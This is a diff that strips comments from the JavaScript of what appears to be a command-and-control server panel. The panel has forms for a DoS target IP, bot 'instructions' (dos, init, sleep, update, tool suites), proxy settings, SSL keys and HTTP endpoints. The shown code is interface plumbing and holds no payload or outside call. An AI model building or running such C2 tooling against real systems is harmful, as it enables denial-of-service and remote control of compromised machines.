@@ -33,7 +33,6 @@
   function clearModalInputs(modalId) {
     const modal = document.getElementById(modalId);
     if (!modal) return;
-    // clear text inputs, number inputs, password inputs, textareas
     modal.querySelectorAll('input, textarea').forEach(el => {
       if (el.type === 'checkbox' || el.type === 'radio') {
         el.checked = false;
@@ -138,7 +137,6 @@
   };
 
   window.saveInstructions = async () => {
-    // 1) Gather whatever the user filled in
     const instructions = {};
   
     if (document.getElementById('dos-target-ip').value) {
@@ -198,12 +196,10 @@
       };
     }
   
-    // 2) If they didn't type anything at all, warn and bail
     if (Object.keys(instructions).length === 0) {
       return showCustomAlert('⚠️ Please fill at least one instruction block.');
     }
   
-    // 3) Try to save to server
     try {
       const res = await fetch('/api/instructions', {
         method: 'POST',
@@ -212,13 +208,11 @@
               });
       if (!res.ok) throw new Error(`Server responded ${res.status}`);
   
-      // 4) On success
       showCustomAlert('✅ Instructions saved!');
     } catch (err) {
       console.error('Error saving instructions:', err);
       showCustomAlert('❌ Failed to save instructions.');
     } finally {
-      // 5) Always clear inputs and close modal
       clearModalInputs('instructions-modal');
       closeInstructionsModal();
     }
@@ -255,11 +249,8 @@
     clearModalInputs('json-editor-section');
   };
   
-// module.js
-
   let selectedFileName = "";
 
-  // 1. User picks a file — remember its name, load its text into the editor
   document.getElementById('json-file-input').addEventListener('change', async e => {
     const file = e.target.files[0];
     if (!file) return;
@@ -269,7 +260,6 @@
     document.getElementById('json-editor').value = text;
   });
 
-  // 2. When they hit “Save” in the JSON editor, send filename + content
   window.saveJSONEditor = async () => {
     if (!selectedFileName) {
       return showCustomAlert('⚠️ No file selected');
@@ -335,15 +325,13 @@ window.openC2Modal = () => {
 window.closeC2Modal = () => {
   document.getElementById('c2-modal').classList.remove('visible');
   document.body.classList.remove('modal-open');
-  clearModalInputs('c2-modal'); // reuse your helper to wipe all the inputs
+  clearModalInputs('c2-modal'); 
 };
 
-// bind the “Options → C2” button somewhere in your init:
 document
-  .getElementById('c2-btn')   // your “C2” button in the grid
+  .getElementById('c2-btn')  
   .addEventListener('click', openC2Modal);
 
-// helper to hook up a file input to a text field
 function wireCompactPicker(fileInputId, textFieldId) {
   const fileInput = document.getElementById(fileInputId);
   const textField = document.getElementById(textFieldId);
@@ -351,22 +339,17 @@ function wireCompactPicker(fileInputId, textFieldId) {
   fileInput.addEventListener('change', e => {
     const file = e.target.files[0];
     if (!file) return;
-    // 1) copy into your text‐field
     textField.value = file.name;
-    // 2) clear the file input so its built‑in filename disappears
     e.target.value = '';
   });
 }
 
-// on DOMContentLoaded or after you render the modal:
 window.addEventListener('DOMContentLoaded', () => {
   wireCompactPicker('c2-dos-file',   'c2-dos');
   wireCompactPicker('c2-init-file',  'c2-init');
   wireCompactPicker('c2-proxy-file', 'c2-proxy');
   wireCompactPicker('c2-maint-file', 'c2-maint');
   wireCompactPicker('c2-suites-file', 'c2-tool-suites');
-  // etc…
-  // …and for the SSL section:
   wireCompactPicker('c2-ssl-chain-file', 'c2-ssl-chain');
   wireCompactPicker('c2-ssl-ca-file',    'c2-ssl-ca');
   wireCompactPicker('c2-ssl-key-file',   'c2-ssl-key');
@@ -380,13 +363,11 @@ window.addEventListener('DOMContentLoaded', () => {
   window.saveC2Config = async () => {
     const cfg = { _id: 'control_server', instructions: {}, general: {}, networking: {} };
   
-    // Instructions
     ['dos','init','sleep','update','tool-suites'].forEach(k => {
       const val = document.getElementById(`c2-${k}`).value;
       if (val) cfg.instructions[k] = val;
     });
   
-    // General
     const gAddr    = document.getElementById('c2-server-address').value;
     const gPort    = document.getElementById('c2-server-port').value;
     const gThreads = document.getElementById('c2-server-threads').value;
@@ -405,7 +386,6 @@ window.addEventListener('DOMContentLoaded', () => {
       if (lPort) cfg.general.logger.port    = lPort;
     }
   
-    // Networking / SSL
     const ssl = {};
     ['chain','ca','key','pub','dh'].forEach(s => {
       const v = document.getElementById(`c2-ssl-${s}`).value;
@@ -419,14 +399,12 @@ window.addEventListener('DOMContentLoaded', () => {
     });
     if (Object.keys(ssl).length) cfg.networking.ssl = ssl;
   
-    // HTTP
     const api = document.getElementById('c2-http-api').value;
     const hdr = document.getElementById('c2-http-header').value;
     cfg.networking.http = {};
     if (api) cfg.networking.http.api_endpoints = api;
     if (hdr) cfg.networking.http.server_header = hdr;
   
-    // Send to your new route
     try {
       const res = await fetch('/api/c2-config', {
         method: 'POST',
